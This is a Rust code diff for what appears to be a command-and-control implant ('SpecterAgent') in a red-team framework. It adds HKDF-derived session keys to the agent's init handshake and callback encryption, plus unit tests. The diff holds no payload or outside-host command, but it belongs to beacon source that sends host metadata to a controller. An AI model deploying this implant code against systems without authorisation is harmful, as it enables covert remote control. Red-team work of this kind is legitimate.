@@ -1,6 +1,8 @@
 //! Core agent logic: init handshake and callback loop.
 
-use red_cell_common::crypto::{AgentCryptoMaterial, generate_agent_crypto_material};
+use red_cell_common::crypto::{
+    AgentCryptoMaterial, derive_session_keys, generate_agent_crypto_material,
+};
 use red_cell_common::demon::DemonCommand;
 use tracing::{info, warn};
 
@@ -15,7 +17,8 @@ use crate::transport::HttpTransport;
 #[derive(Debug)]
 pub struct SpecterAgent {
     agent_id: u32,
-    crypto: AgentCryptoMaterial,
+    raw_crypto: AgentCryptoMaterial,
+    session_crypto: AgentCryptoMaterial,
     config: SpecterConfig,
     transport: HttpTransport,
     /// Current CTR block offset for outgoing encryption.
@@ -30,12 +33,30 @@ impl SpecterAgent {
         config.validate()?;
 
         let agent_id = rand::random::<u32>() | 1; // ensure non-zero
-        let crypto = generate_agent_crypto_material()?;
+        let raw_crypto = generate_agent_crypto_material()?;
+        let session_crypto = match config.init_secret.as_deref() {
+            Some(secret) => {
+                derive_session_keys(&raw_crypto.key, &raw_crypto.iv, secret.as_bytes())?
+            }
+            None => raw_crypto.clone(),
+        };
         let transport = HttpTransport::new(&config)?;
 
-        info!(agent_id = format_args!("0x{agent_id:08X}"), "agent initialized");
+        info!(
+            agent_id = format_args!("0x{agent_id:08X}"),
+            hkdf_session = config.init_secret.is_some(),
+            "agent initialized"
+        );
 
-        Ok(Self { agent_id, crypto, config, transport, send_ctr_offset: 0, recv_ctr_offset: 0 })
+        Ok(Self {
+            agent_id,
+            raw_crypto,
+            session_crypto,
+            config,
+            transport,
+            send_ctr_offset: 0,
+            recv_ctr_offset: 0,
+        })
     }
 
     /// Collect metadata about the current host environment.
@@ -73,12 +94,12 @@ impl SpecterAgent {
     /// the CTR counters are advanced past the init exchange.
     pub async fn init_handshake(&mut self) -> Result<(), SpecterError> {
         let metadata = self.collect_metadata();
-        let packet = build_init_packet(self.agent_id, &self.crypto, &metadata)?;
+        let packet = build_init_packet(self.agent_id, &self.raw_crypto, &metadata)?;
 
         info!(agent_id = format_args!("0x{:08X}", self.agent_id), "sending DEMON_INIT");
 
         let response = self.transport.send(&packet).await?;
-        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.crypto)?;
+        let ack_blocks = parse_init_ack(&response, self.agent_id, &self.session_crypto)?;
 
         // After init, the server encrypted the ACK at offset 0 and advanced by ack_blocks.
         // We decrypted at offset 0 and must advance our recv counter to match.
@@ -107,7 +128,7 @@ impl SpecterAgent {
 
         let packet = build_callback_packet(
             self.agent_id,
-            &self.crypto,
+            &self.session_crypto,
             self.send_ctr_offset,
             command_id,
             request_id,
@@ -216,6 +237,23 @@ mod tests {
         assert!(agent.is_ok());
         let agent = agent.expect("already checked");
         assert_ne!(agent.agent_id(), 0);
+    }
+
+    #[test]
+    fn agent_without_init_secret_uses_raw_session_crypto() {
+        let agent = SpecterAgent::new(SpecterConfig::default()).expect("agent creation");
+        assert_eq!(agent.raw_crypto, agent.session_crypto);
+    }
+
+    #[test]
+    fn agent_with_init_secret_derives_session_crypto() {
+        let config = SpecterConfig {
+            init_secret: Some(String::from("shared-init-secret")),
+            ..Default::default()
+        };
+        let agent = SpecterAgent::new(config).expect("agent creation");
+
+        assert_ne!(agent.raw_crypto, agent.session_crypto);
     }
 
     #[test]
